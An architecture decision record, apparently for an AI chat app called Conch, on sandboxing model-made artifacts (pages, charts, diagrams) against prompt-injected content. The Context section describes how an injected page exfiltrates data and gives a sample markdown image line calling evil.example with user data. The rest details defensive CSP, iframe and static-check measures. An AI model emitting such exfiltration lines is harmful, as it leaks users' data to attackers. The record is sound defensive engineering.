# 0034 — Show me: things made beside the chat, sealed pages, pinned apps

- Status: accepted
- Date: 2026-10-01
- Builds on: [ADR 0008](./0008-access-and-hardening.md) (the agent is untrusted input),
  [ADR 0014](./0014-browser.md) (the panel beside the chat),
  [ADR 0027](./0027-in-your-pocket.md) (the phone),
  [ADR 0028](./0028-safe-hands.md) (the guard after reading, Activity)

## Context

Some answers aren't a paragraph. They're a tip calculator, a chart of last
week's numbers, a trip plan to keep, or a diagram of how something works.
Claude.ai calls these Artifacts and ChatGPT calls them Canvas. In a chat they
scroll away and can't be used.

The risk is that the thing is code a model wrote, and the model may have just
read a hostile web page (ADR 0028). The classic ways a prompt-injected page
gets out are:

- **The markdown image.** `![](https://evil.example/?d=<your data>)` is fetched
  as soon as it's shown.
- **The same, with fonts, CSS and `fetch`.**
- **A link, a form or a redirect** that carries data in its address.
- **Reaching up into the page that shows it**: cookies, storage, the Conch API.

## Decision

### 1. Six kinds, every provider

An artifact is one of `html` (a self-contained page or small app), `markdown`,
`svg`, `mermaid`, `chart` or `table` (CSV). How it gets made depends on the
provider:

- **Providers with Conch's tools** call `artifact_create` and `artifact_update`.
- **Providers without tools (Codex)** write a fenced ` ```artifact kind="…" title="…" ` block. Conch takes it out of the reply when the turn ends
  (`ArtifactService.onEvent`).

Content is checked against its kind with Zod and `checkContent`: a chart is a
`ChartSpec` with one value per label, an svg starts with `<svg`, and a table
has a header row. When it doesn't fit, the model gets a sentence it can act on.
The limit is 400,000 characters.

Artifacts are stored in `~/.conch/artifacts/<id>/`:

- `artifact.json` describes the artifact.
- `v<n>.<ext>` holds each version exactly as it was.
- 30 versions are kept, and the first is always kept.
- A damaged `artifact.json` is rebuilt from the version files, with a healing
  note.
- Backups keep artifacts (`artifacts/**`, the chats group).
- The doctor counts them.

The chat gets an `artifact` event, and the transcript shows it as a card.
Activity lists it as "Made …" or "Updated …".

### 2. Beside the chat

The panel sits next to the chat and resizes like the browser (only one of the
two is open at a time). It opens by itself when something new is made, unless
you closed it since. On a phone it slides over the chat.

The panel has three tabs:

- **View** (or **Use** for a page): the thing itself.
- **Code**: its text. A chart's JSON is laid out one value per line.
- **Changes**: a line diff against the version before.

It also has a version picker and buttons for Copy, Download, Pin as an app,
Full screen and Delete. Each version's text is fetched once and kept.

Conch draws everything except pages itself, so they always look like Conch:

- **Charts** come from `ArtifactChart`. It uses a fixed, colour-blind-checked
  order of eight `--nc-chart-*` colours, thin marks and a recessive grid. Two
  or more series get a legend. Every mark has a tooltip, and the same numbers
  are one press away as a table.
- **Tables** are sortable by any column, and numbers sort as numbers.
- **Documents** are Markdown that loads no pictures from any address (only
  `data:` images).
- **SVG and Mermaid** are shown as an `<img>` with a `data:` URL, so they can't
  run code or fetch anything. Mermaid renders in the page at
  `securityLevel: 'strict'` with HTML labels off. The library loads only when
  a diagram is shown (lazy chunk).

### 3. A page runs sealed off

The page is served from its own route,
`/api/artifacts/:id/versions/:n/frame`. Being under `/api` puts it behind the
gateway's host, Fetch-Metadata, origin and sign-in checks.

The route sets its own headers:

- `Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'; frame-src 'none'; worker-src 'none'; frame-ancestors 'self'; sandbox allow-scripts`
- `X-Frame-Options: SAMEORIGIN`
- `X-Content-Type-Options: nosniff`
- `Content-Disposition: inline`
- `Referrer-Policy: no-referrer`
- CORP and COOP `same-origin`
- Every Permissions-Policy feature off
- `no-store`

The iframe is `sandbox="allow-scripts"`, never with `allow-same-origin`,
popups, forms or top navigation. So:

- **The page is nobody.** Its origin is opaque, with no cookies, no storage,
  no Conch API, and no way into the parent page. The response's own `sandbox`
  directive keeps this true even when the frame URL is opened directly.
- **Nothing can be fetched.** `connect-src 'none'` stops requests, and images,
  fonts and media only come from `data:` and `blob:`. Nothing can leave in an
  image's or a font's address.
- **There is no way out.** Popups, top navigation and forms are all blocked.
  `<base target="_blank">` means a link would open a new tab, which a sealed
  page can't do. When the page's code runs, Conch's bridge catches a link
  click and asks "Open evil.example?", showing the full address. If you say
  yes, the link opens with `noopener,noreferrer`.
- **The page says almost nothing.** The bridge (`postMessage`) sends only the
  page's height and "open this link". The panel believes a message only if it
  comes from that very frame (`event.source`), and only accepts http(s)
  addresses under 2,048 characters.

The one thing CSP can't stop is a page's script sending its own frame to
another address. Two measures cover it:

- **Static check.** Conch looks for anything that could do this: `location`,
  `window.open`, `top`/`parent`/`opener`, forms, meta refresh, links out,
  nested frames, and `.click()`/`.submit()`. A version that has any is marked
  `navigates`. The server serves it with `script-src 'none'` unless the panel
  asks with `scripts=1`, which it does only after you press **Run it anyway**.
- **Runtime check.** The panel stops and blanks any frame that loads a second
  time.

Downloads are always attachments, carry `sandbox` in their CSP and are served
`nosniff`.

### 4. Pin as an app

**Pin as an app** puts an artifact in the sidebar under **Apps**. It opens on
its own page, `/apps/:id`, straight from the cache.

If it was made for a request, **Refresh** asks for fresh data. That runs a chat
of its own (origin `artifact`, kept out of the chat list) that can only call
`artifact_update` on that one artifact. Like any chat, it falls under the guard
(ADR 0028): it reads the web, and anything that would send something out asks
first. The new version is marked `refreshed`.

### 5. Found everywhere

- **⌘K** finds artifacts by name: a pinned one opens on its page, anything else
  beside its chat.
- **Activity** has a **Made** filter.
- **The mock engine** makes one of each kind ("make me a chart / page /
  document / diagram / table", "make it …"). It also makes a page with a link
  out ("with a link") and handles a refresh, for the e2e journey.

## Consequences

- People get things they can use, keep and come back to. Prompt-injected pages
  can't reach Conch, the network, or the person's data, and every escape path
  has a test, in `artifacts.test.ts` and in `e2e/show-me.spec.ts` from inside
  the frame: cookies, storage, the parent, `fetch` to the API and out, top
  navigation, popups, and image exfil.
- **Residual risk.** A page that passes the static check and then navigates its
  own frame is stopped after the first request has left. Its address can carry
  whatever is on the page. That's never Conch's data, but it can be something
  the page itself shows.
- **New dependency:** `mermaid` (web only, lazy). Rendering diagrams ourselves
  would mean writing and maintaining a parser for every diagram type, a far
  bigger surface than one well-kept library at its strictest setting.
- **Not done:** editing an artifact by hand, sharing it outside Conch, and
  pages that need the network. A page that needs live data asks for a refresh
  instead. (Editing by hand and live data came later: [ADR 0046](./0046-edit-by-hand-and-live-data.md).)
